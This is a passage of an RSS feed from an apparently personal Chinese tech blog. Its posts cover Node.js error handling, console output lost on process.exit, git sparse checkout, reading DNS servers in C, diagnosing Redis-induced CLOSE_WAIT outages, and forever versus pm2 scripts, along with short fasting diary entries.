]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[肉肉又长回来了]]></title>
            <link>/article/8089808953c8957f56de67654e86.html</link>
            <guid>/article/8089808953c8957f56de67654e86.html</guid>
            <pubDate>Tue, 03 Nov 2015 09:27:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
早上称了一下体重，到了67.8公斤，停止断食1个多月的成果就是长了5-6斤肉肉。
</p>

<p>
轻断食是一种生活方式，果然没有说错。
</p>

<p>
今天开始继续一周两断的生活，减下来以后也要维持一周一断才行。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[node.js应用错误处理]]></title>
            <link>/article/node.js-5e94752895198bef59047406.html</link>
            <guid>/article/node.js-5e94752895198bef59047406.html</guid>
            <pubDate>Fri, 30 Oct 2015 10:08:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
先看一个简单的示例：
</p>

<div class="org-src-container">

<pre class="src src-js">app.post(<span style="color: #8abeb7;">'/products'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">req</span>, <span style="color: #f0c674;">res</span>) {
<span style="background-color: #373b41;"> </span>   service.add(req.body, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   logger.error(err.toString());
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   res.statusCode = 500;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> res.end({error: err.message});
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   res.statusCode = 200;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   res.end();
<span style="background-color: #373b41;"> </span>   });
}};
</pre>
</div>

<p>
上面的代码能够直接用于产品环境吗？
</p>

<p>
对于稍微严谨的产品，答案肯定是 <span class="underline">否</span> 。
</p>

<p>
针对 service.add 调用失败提两个疑问：
</p>

<ul class="org-ul">
<li>如何根据错误类型给客户端返回不同的响应，以便客户端更人性化（而非简单的弹消息框）？
</li>

<li>err.message 会不会包含不应该给用户看到的信息？
</li>
</ul>

<p>
我们需要规范化错误类型，进行明确的分类标识，直到最外层的代码能够根据错误对象提供的信息，给客户端返回恰当的响应，
下面是我能想到的一些基本原则：
</p>

<ul class="org-ul">
<li>错误对象拥有统一的接口

<p>
确保错误对象是一个Error类实例，如需要自定义错误类型，从Error类继承。
</p>
</li>

<li>对错误进行命名标识

<p>
重量级的做法：为每一个错误类型自定义一个错误类。
轻量级的做法：将Error对象的name属性设置为错误类型标识。
</p>
</li>

<li>在恰当的层次将底层Error对象转化为自定义的错误对象

<p>
对底层返回的原始错误，尽可能在调用栈恰当的层次转化为合适应用层错误对象，但不必强制对所有底层错误进行转换，
原生的Error对象可以认为是未标识的错误，这种错误可以默认处理（如：给客户端返回HTTP 500错误）。
</p>
</li>
</ul>

<p>
错误进行分类标识后的使用示例：
</p>

<div class="org-src-container">

<pre class="src src-js">app.post(<span style="color: #8abeb7;">'/products'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">req</span>, <span style="color: #f0c674;">res</span>) {
<span style="background-color: #373b41;"> </span>   service.add(req.body, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">err</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   logger.error(err.toString());
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (err.name === <span style="color: #8abeb7;">'ProductAlreadyExists'</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   res.statusCode = 400;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   err.message = <span style="color: #8abeb7;">'&#20869;&#37096;&#38169;&#35823;'</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   res.statusCode = 500;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> res.end({error: err.message});
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   res.statusCode = 200;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   res.end();
<span style="background-color: #373b41;"> </span>   });
}};
</pre>
</div>

<p>
优雅的错误处理是系统可维护性的重要组成部分，它和代码各部分息息相关，系统成型后很难再引入错误处理，设计系统时应该一开始就将它纳入考虑范围。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">参考</h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>《<a href="https://www.joyent.com/developers/node/design/errors">Error Handling in Nodejs - Developer Center - Joyent</a>》

<p>
来自Joyent的Node.js错误处理最佳实践
</p>
</li>

<li>《<a href="https://cnodejs.org/topic/52090bc944e76d216af25f6f">Node.js下自定义错误类型 - CNode</a>》

<p>
派生Error类注意事项
</p>
</li>

<li>《<a href="https://docs.nodejitsu.com/articles/errors/what-is-the-error-object">What is the error object? - docs.nodejitsu.com</a>》

<p>
Error对象详解
</p>
</li>

<li>《<a href="http://www.bennadel.com/blog/2828-creating-custom-error-objects-in-node-js-with-error-capturestacktrace.htm">Creating Custom Error Objects In Node.js With Error.captureStackTrace()</a>》

<p>
直接可用的自定义Error类方案
</p>
</li>

<li><a href="https://github.com/jayyvis/extend-error">extend-error</a>

<p>
用于扩展Error类的node.js模块
</p>
</li>

<li><a href="https://github.com/davepacheco/node-verror">node-verror</a>

<p>
包裹原始Error对象，并且保证可访问性的node.js模块，Joyent的Node.js错误处理最佳实践中进行了推荐
</p>
</li>

<li>《<a href="https://github.com/davepacheco/node-verror/issues/15">Support for custom error types? · Issue #15 · davepacheco/node-verror</a>》

<p>
<a href="https://github.com/davepacheco/node-verror">node-verror</a> 支持扩展的讨论</p>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[process.exit导致的控制台输出不全]]></title>
            <link>/article/process.exit-5bfc81f4768463a7523653f08f9351fa4e0d5168.html</link>
            <guid>/article/process.exit-5bfc81f4768463a7523653f08f9351fa4e0d5168.html</guid>
            <pubDate>Thu, 27 Aug 2015 09:03:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>先上案例程序：

<div class="org-src-container">

<pre class="src src-js"><span style="color: #b5bd68;">for</span>(<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">i</span> = 0; i &lt; 10000; ++i) {
<span style="background-color: #373b41;"> </span>   console.log(<span style="color: #8abeb7;">"this is long long long long long long long long long long long </span><span style="color: #8abeb7; text-decoration: underline;">long long long long long long long long long long long long long long long long long long log "</span><span style="text-decoration: underline;"> + i);</span>
}
process.exit(0);
</pre>
</div>

<p>
这个程序输出10000行日志，然后结束进程。
</p>
</li>

<li><code>Emacs Shell</code> 以及 <code>GNOME Terminal</code> 下运行结果（省略中间部分输出）：

<pre class="example">
$ node /home/tangxinfa/Examples/test_exit.js
this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 0
...
this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 119
$
</pre>

<p>
程序只输出了前面200行日志。
</p>
</li>

<li>按 <code>Ctrl+Alt+F2</code> 进入2号系统终端下运行结果（省略中间部分输出）：

<pre class="example">
$ node /home/tangxinfa/Examples/test_exit.js
this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 0
...
this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 9999
$
</pre>

<p>
程序输出了完整的日志。
</p>
</li>

<li>日志重定向到文件时 <code>Emacs Shell</code> 以及 <code>GNOME Terminal</code> 下运行结果（省略中间部分输出）：

<pre class="example">
$ node /home/tangxinfa/Examples/test_exit.js &gt; /tmp/test_exit.log
$ tail -1 /tmp/test_exit.log
this is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 9999
$
</pre>

<p>
程序输出了完整的日志。
</p>
</li>

<li>原因

<p>
如果输出目标为终端（ <code>Emacs Shell</code> 以及 <code>GNOME Terminal</code> 并非真正的终端）或文件时，console函数是同步的（避免程序过早退出导致丢消息），目标为管道时则为异步（避免长时间堵塞）。
</p>

<blockquote>
<p>
The console functions are synchronous when the destination is a terminal or a file (to avoid lost messages in case of premature exit) and asynchronous when it's a pipe (to avoid blocking for long periods of time).
</p>
</blockquote>

<p>
参考：《<a href="http://stackoverflow.com/questions/18748164/process-exit0-output-disappears">process.exit(0): output disappears?</a>》
</p>
</li>

<li>解决方案

<p>
调用 <code>process.exit</code> 时确保输出完毕，封装如下：
</p>

<div class="org-src-container">

<pre class="src src-js"><span style="color: #969896; font-style: italic;">/// </span><span style="color: #969896; font-style: italic;">Safe exit. Makesure log output flushed to console.</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">exit</span>(<span style="color: #f0c674;">code</span>) {
<span style="background-color: #373b41;"> </span>   process.stdout.write(<span style="color: #8abeb7;">''</span>, <span style="color: #b5bd68;">function</span> () {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   process.stderr.write(<span style="color: #8abeb7;">''</span>, <span style="color: #b5bd68;">function</span> () {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   process.exit(code);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   });
<span style="background-color: #373b41;"> </span>   });
}
</pre>
</div>

<p>
注意，上面的 <code>exit</code> 函数不会像 <code>process.exit</code> 一样立即终止程序，请将 <code>process.exit</code> 替换为  <code>return exit</code> 。</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[拉取git仓库的子目录]]></title>
            <link>/article/62c953d6-git-4ed35e9376845b5076ee5f55.html</link>
            <guid>/article/62c953d6-git-4ed35e9376845b5076ee5f55.html</guid>
            <pubDate>Wed, 26 Aug 2015 10:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
我们的git仓库目录结构：
</p>

<pre class="example">
http://server/company.git +
                          |
                          +- project1
                          |
                          +- project2
                          |
                          +- project3
                          |
                          +- ...
</pre>

<p>
以前使用svn的时候是可以直接拉取其中一个子项目，像下面这样：
</p>

<div class="org-src-container">

<pre class="src src-sh">svn checkout http://server/company.git/project1
</pre>
</div>

<p>
但是git好像不支持这种用法，网上找了一下相关资料，可以借助git的 <code>Sparse checkout</code> 实现：
</p>

<div class="org-src-container">

<pre class="src src-sh">git clone http://server/company.git --no-checkout
<span style="color: #b294bb;">cd</span> company
git config core.sparsecheckout true
<span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"project1/"</span> &gt; .git/info/sparse-checkout
git checkout --
<span style="color: #b294bb;">cd</span> ..
ln -s company/project1 ./
</pre>
</div>

<ul class="org-ul">
<li>参考

<p>
《<a href="http://stackoverflow.com/questions/4114887/is-it-possible-to-do-a-sparse-checkout-without-checking-out-the-whole-repository">Is it possible to do a sparse checkout without checking out the whole repository first?</a>》</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[轻断食日（2015-8-25）]]></title>
            <link>/article/8f7b65ad98df65e5ff08-2015-8-25-ff09.html</link>
            <guid>/article/8f7b65ad98df65e5ff08-2015-8-25-ff09.html</guid>
            <pubDate>Tue, 25 Aug 2015 06:43:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
今天是轻断食日，感觉很自然，早上给小孩喂饭时也没有顺便吃一点，体重已经稳定在64-65公斤，最近几周已经调整为一周一天断食，目前的体重已经比较合理，等肌肉结实一点再恢复到一周二天断食继续减轻一些体重，仍然用的是前一天晚餐和第二天早餐不吃的方法，断食时间大部分在睡觉容易施行。
</p>

<p>
Cheers!</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下编程获取/etc/resolv.conf中的域名解析服务器]]></title>
            <link>/article/linux-4e0b7f167a0b83b753d6-etc-resolv.conf-4e2d768457df540d89e36790670d52a15668.html</link>
            <guid>/article/linux-4e0b7f167a0b83b753d6-etc-resolv.conf-4e2d768457df540d89e36790670d52a15668.html</guid>
            <pubDate>Fri, 14 Aug 2015 10:01:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
直接上代码吧：
</p>

<div class="org-src-container">

<pre class="src src-c"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;unistd.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;sys/types.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;netinet/in.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;arpa/inet.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;arpa/nameser.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;resolv.h&gt;</span>

<span style="color: #81a2be;">int</span> <span style="color: #de935f;">main</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">argc</span>, <span style="color: #81a2be;">char</span> *<span style="color: #f0c674;">argv</span>[])
{
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">__res_state</span> <span style="color: #f0c674;">res</span>;
<span style="background-color: #373b41;"> </span>   res.options &amp;= ~ RES_INIT;

<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">int</span> <span style="color: #f0c674;">err</span> = res_ninit(&amp;res);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (err) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   fprintf(stderr, <span style="color: #8abeb7;">"res_init error: %d\n"</span>, err);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> err;
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">char</span> <span style="color: #f0c674;">ip</span>[16];
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">i</span> = 0 ; i &lt; res.nscount; ++i) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   ip[0] = <span style="color: #8abeb7;">'\0'</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #81a2be;">!</span> inet_ntop(AF_INET, &amp;res.nsaddr_list[i].sin_addr, ip, <span style="color: #b5bd68;">sizeof</span>(ip))) <span style="text-decoration: underline;">{</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   perror(<span style="color: #8abeb7;">"inet_ntop"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">continue</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   printf(<span style="color: #8abeb7;">"ip: %s\n"</span>, ip);
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   res_nclose(&amp;res);

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> 0;
}
</pre>
</div>

<ul class="org-ul">
<li>参考

<p>
《<a href="http://stackoverflow.com/questions/2916675/programmatically-obtain-dns-servers-of-host">Programmatically obtain DNS servers of host</a>》</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[升级redis到最新版本的过程]]></title>
            <link>/article/53477ea7-redis-5230670065b07248672c76848fc77a0b.html</link>
            <guid>/article/53477ea7-redis-5230670065b07248672c76848fc77a0b.html</guid>
            <pubDate>Mon, 10 Aug 2015 09:56:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>编译最新版本的redis，暂不要安装

<p>
参见《<a href="http:7f168bd15b8988c5-redis.html">编译安装redis</a>》
</p>
</li>

<li>将旧版的redis.conf配置文件中的配置项合入新版本redis.conf

<p>
可能需要提前确认一下新版本redis是否兼容旧版本数据文件。
</p>
</li>

<li>卸载并停止旧版本redis
</li>

<li>安装新版本redis

<p>
参见《<a href="http:7f168bd15b8988c5-redis.html">编译安装redis</a>》
</p>
</li>

<li>启动新版本redis
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux服务器出现大量CLOSE_WAIT状态的连接]]></title>
            <link>/article/linux-670d52a1566851fa73b0592791cf-close_wait-72b6600176848fde63a5.html</link>
            <guid>/article/linux-670d52a1566851fa73b0592791cf-close_wait-72b6600176848fde63a5.html</guid>
            <pubDate>Sat, 01 Aug 2015 19:21:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
昨天服务器停止服务，node.js进程耗光了服务器的内存及CPU，node.js进程卡死无法被 <code>kill</code> 掉，最后要来root帐号密码，直接 <code>kill -9</code> 才结束掉进程。
</p>

<p>
再次鄙视一下 <a href="https://github.com/nodejitsu/forever">forever</a> ，杀不掉原来的 node.js 进程组也就罢了，竟然又拉起了一套新的 node.js 进程组。
</p>

<p>
统计了一下 <code>10</code> 万个fd都耗光了，其中 <code>9</code> 万多个为 <code>CLOSE_WAIT</code> 状态，此时服务器已经无法响应请求。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">CLOSE_WAIT 状态介绍</h2>
<div class="outline-text-2" id="text-1">
<p>
先看一副TCP连接关闭的状态图（ <a href="http://intronetworks.cs.luc.edu/current/html/tcp.html#index-29">来源</a> ）：
</p>


<div class="figure">
<p><img src="../static/tcp_normal_close.png" alt="tcp_normal_close.png" />
</p>
</div>

<p>
被动关闭一方才会出现 <code>CLOSE_WAIT</code> 状态，由于被动关闭方未调用 <code>close</code> 关闭socket导致，问题肯定是由服务器代码引起。
</p>

<p>
检测到对端socket关闭然后关闭本端socket是由 node.js 自行完成的，最大的可能是没有机会执行 <code>close</code> 。
</p>

<p>
我们的应用客户端与服务器有一个tls长连接，当连接断开时客户端会等待3-10秒后尝试重连服务器，如果服务器出现卡顿会导致客户端频繁重连，
</p>

<p>
如果服务器来不及关闭这些连接，则会出现 CLOSE_WAIT 状态的连接，占用大量文件描述符，减少 CLOSE_WAIT 超时时间能够在一定程度上缓解这个问题，
</p>

<p>
但是对于我们这种长连接的环境，大量CLOSE_WAIT是问题的表象，而非根源。
</p>

<p>
参考：《<a href="http://lvxuehu.iteye.com/blog/452487">解决CLOSE_WAIT 问题</a>》
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">内存及CPU占用彪升问题</h2>
<div class="outline-text-2" id="text-2">
<p>
伴随着 CLOSE_WAIT 出现的状况是 node.js 进程内存及CPU占用超高，单node.js进程内存占用达到 1.5G，CPU占用 90% 以上，此时应该会导致 node.js 响应慢，
来不及关闭连上来的socket。
</p>

<p>
所以解决问题的关键就是：找出什么原因导致 node.js 内存及CPU 100%占用。
</p>

<p>
想到的可能是redis负载过高引起，从运维监控图上可以看出一些蹊跷，node.js出问题时redis的连接数也同样彪升，而出问题的机器上刚好就是跑redis的机器，
另一台服务器一直相安无事，没有跑redis。
</p>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">一次午夜故障元凶浮出水面</h2>
<div class="outline-text-2" id="text-3">
<p>
在晚上两点的时候服务出现问题，同样的现象，特别留意了一下redis的统计，请求速度很低，只有1200，平时都是5000。偶然在进程列表中发现了 redis-rdb-bgsave 的身影，
不断地执行ps看进程列表，发现 redis-rdb-bgsave 进程不断地出现，查看redis的持久化配置如下：
</p>

<pre class="example">
save 900 1
save 300 10
save 60 10000
</pre>

<p>
我们的系统有大量的redis，1分钟肯定过万，这样redis持久化变是常态了，而且由于用的是机械硬盘，持久化肯定会引起系统卡顿，先将它调整为15分钟最多持久化一次：
</p>

<pre class="example">
config set save "900 1"
</pre>

<p>
重启程序释放资源后系统开始正常响应，但是10多分钟后系统再次无响应，才想起一则经验教训：
</p>

<pre class="example">
     跑redis的机器至少要预留和redis占用内存同样大小的空闲内存空间，redis RDB持久化进行fork时最坏会占用双倍内存，内存不足就会动用交换分区，系统性能急剧下降。
</pre>

<p>
于是，立即改配置将redis所在机器上的node.js cluster进程数调小，腾出大把内存，总算没有再出现问题，今晚终于可以入眠。
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">更多疑问</h2>
<div class="outline-text-2" id="text-4">
<ul class="org-ul">
<li>我们的node.js进程为什么常常会占用很多内存？
</li>

<li>netstat中看到CLOSE_WAIT状态的连接输入缓冲往往有数据，而ESTABLISHED状态的连接读写缓冲区往往为空，为什么？
</li>

<li>node.js卡顿时forever杀不死反而启动了新实例帮倒忙，pm2就一定能够解决吗？
</li>

<li>redis持久化引起服务挂掉，已经是在第二个项目中遇到了，终极解决方案是什么？
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[后台服务监护工具：forever与pm2]]></title>
            <link>/article/540e53f0670d52a176d162a45de55177ff1a-forever-4e0e-pm2.html</link>
            <guid>/article/540e53f0670d52a176d162a45de55177ff1a-forever-4e0e-pm2.html</guid>
            <pubDate>Fri, 24 Jul 2015 16:15:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
使用后台服务监护工具有很多好处：
</p>

<ul class="org-ul">
<li>程序崩溃时自动拉起
</li>

<li>程序日志聚合（你的系统有多个模块或多个进程的时候很有必要）
</li>

<li>代码更新时自动重启服务
</li>
</ul>

<p>
node.js下最常用的后台服务监护工具有：<a href="https://github.com/nodejitsu/forever">forever</a> 、<a href="https://github.com/Unitech/pm2">pm2</a> 。
</p>

<p>
<a href="https://github.com/nodejitsu/forever">forever</a> 先出现，<a href="https://github.com/Unitech/pm2">pm2</a> 后出现功能更丰富，下面是特性对比：
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="left" />

<col  class="left" />

<col  class="left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="left">Feature</th>
<th scope="col" class="left">Forever</th>
<th scope="col" class="left">PM2</th>
</tr>
</thead>
<tbody>
<tr>
<td class="left">Keep Alive</td>
<td class="left">✔</td>
<td class="left">✔</td>
</tr>

<tr>
<td class="left">Coffeescript</td>
<td class="left">✔</td>
<td class="left">&#xa0;</td>
</tr>

<tr>
<td class="left">Log aggregation</td>
<td class="left">&#xa0;</td>
<td class="left">✔</td>
</tr>

<tr>
<td class="left">API</td>
<td class="left">&#xa0;</td>
<td class="left">✔</td>
</tr>

<tr>
<td class="left">Terminal monitoring</td>
<td class="left">&#xa0;</td>
<td class="left">✔</td>
</tr>

<tr>
<td class="left">Clustering</td>
<td class="left">&#xa0;</td>
<td class="left">✔</td>
</tr>

<tr>
<td class="left">JSON configuration</td>
<td class="left">&#xa0;</td>
<td class="left">✔</td>
</tr>
</tbody>
</table>

<p>
我在3个项目中使用 <a href="https://github.com/nodejitsu/forever">forever</a> ，多次重启出错后，决定转向 <a href="https://github.com/Unitech/pm2">pm2</a> ，目前我已经在两个较小的项目中成功使用 <a href="https://github.com/Unitech/pm2">pm2</a> 。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1"><a href="https://github.com/nodejitsu/forever">forever</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>安装

<div class="org-src-container">

<pre class="src src-js">npm install -g forever
</pre>
</div>
</li>

<li>配置

<p>
启动脚本
<code>start.sh</code>
</p>
<div class="org-src-container">

<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">PATH</span>=$<span style="color: #f0c674;">PATH</span>:<span style="color: #b294bb;">`pwd`</span>/node/bin:<span style="color: #b294bb;">`pwd`</span>/../node/bin:<span style="color: #b294bb;">`pwd`</span>/node_modules/forever/bi<span style="text-decoration: underline;">n:/usr/local/node/bin</span>
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">NODE_ENV</span>=${<span style="color: #f0c674;">NODE_ENV</span>:-production}
<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">NODE_CONFIG_DIR</span>=<span style="color: #b294bb;">`pwd`</span>/config

<span style="color: #f0c674;">SCRIPT</span>=<span style="color: #b294bb;">`pwd`</span>/src/index.js
<span style="color: #f0c674;">LOGFILE</span>=<span style="color: #b294bb;">`pwd`</span>/run.log

<span style="color: #f0c674;">running</span>=<span style="color: #b294bb;">`forever list | grep "$SCRIPT" | grep -v grep | wc -l`</span>

<span style="color: #b5bd68;">if</span> [ $<span style="color: #f0c674;">running</span> -lt 1 ]; <span style="color: #b5bd68;">then</span>
<span style="background-color: #373b41;"> </span>   forever start --spinSleepTime=10000 --killSignal=SIGINT --pidFile=<span style="color: #b294bb;">`pwd`</span>/run.<span style="text-decoration: underline;">pid -l $</span><span style="color: #f0c674; text-decoration: underline;">LOGFILE</span><span style="text-decoration: underline;"> -a -w --watchDirectory=</span><span style="color: #b294bb; text-decoration: underline;">`pwd`</span><span style="text-decoration: underline;">/src --watchIgnore=</span><span style="color: #8abeb7; text-decoration: underline;">".svn/*"</span><span style="text-decoration: underline;"> </span><span style="color: #8abeb7; text-decoration: underline;">"$SCRIPT"</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b294bb;">echo</span> -e <span style="color: #8abeb7;">"\nRunning."</span>
<span style="color: #b5bd68;">else</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b294bb;">echo</span> -e <span style="color: #8abeb7;">"\nAlready running."</span>
<span style="color: #b5bd68;">fi</span>

forever list | grep <span style="color: #8abeb7;">"$SCRIPT"</span>
</pre>
</div>

<p>
停止脚本
<code>stop.sh</code>
</p>
<div class="org-src-container">

<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">PATH</span>=$<span style="color: #f0c674;">PATH</span>:<span style="color: #b294bb;">`pwd`</span>/node/bin:<span style="color: #b294bb;">`pwd`</span>/../node/bin:<span style="color: #b294bb;">`pwd`</span>/node_modules/forever/bi<span style="text-decoration: underline;">n:/usr/local/node/bin</span>

<span style="color: #f0c674;">SCRIPT</span>=<span style="color: #b294bb;">`pwd`</span>/src/index.js

forever stop <span style="color: #8abeb7;">"$SCRIPT"</span>
</pre>
</div>

<p>
重启脚本     
<code>restart.sh</code>
</p>
<div class="org-src-container">

<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #b294bb;">export</span> <span style="color: #f0c674;">PATH</span>=$<span style="color: #f0c674;">PATH</span>:<span style="color: #b294bb;">`pwd`</span>/node/bin:<span style="color: #b294bb;">`pwd`</span>/../node/bin:<span style="color: #b294bb;">`pwd`</span>/node_modules/forever/bi<span style="text-decoration: underline;">n:/usr/local/node/bin</span>

<span style="color: #f0c674;">SCRIPT</span>=<span style="color: #b294bb;">`pwd`</span>/src/index.js

forever restart <span style="color: #8abeb7;">"$SCRIPT"</span> || ./start.sh
</pre>
</div>
</li>

<li>用法

<p>
启动
</p>

<div class="org-src-container">

<pre class="src src-sh">./start.sh
</pre>
</div>

<p>
停止
</p>

<div class="org-src-container">

<pre class="src src-sh">./stop.sh
</pre>
</div>

<p>
重启
</p>

<div class="org-src-container">

<pre class="src src-sh">./restart.sh
</pre>
</div>
</li>

<li>缺点

<ul class="org-ul">
<li>程序退出过程中的日志无法捕获

<p>
参见：<a href="https://github.com/foreverjs/forever/issues/385#issuecomment-115163346">no logging after graceful shutdown #385</a>
</p>

<p>
应该是forever通过信号通知程序退出后，不再捕获程序的日志输出，程序退出的这段时间内日志丢失。
</p>

<p>
一个补丁方案：程序收到forever的退出信号后将日志直接写到日志文件（正常情况下是由forever捕获程序的错误输出写日志文件）。
</p>
</li>

<li>重启可能失败

<p>
代码更新后，forever会发信号重启进程，但是程序始终重启不成功，出现大量下面的日志：
</p>
<pre class="example">
Error: bind EADDRINUSE
</pre>

<p>
怀疑跟node.js的cluster中master自动拉起slave的行为相冲突，此时只有一个forever实例在运行，这种情况占比很高。
</p>

<p>
另外crontab中调用start.sh也可能和forever相冲突，当node全退出时，可能启动多个forever实例，这种情况占比稍低。
</p>

<p>
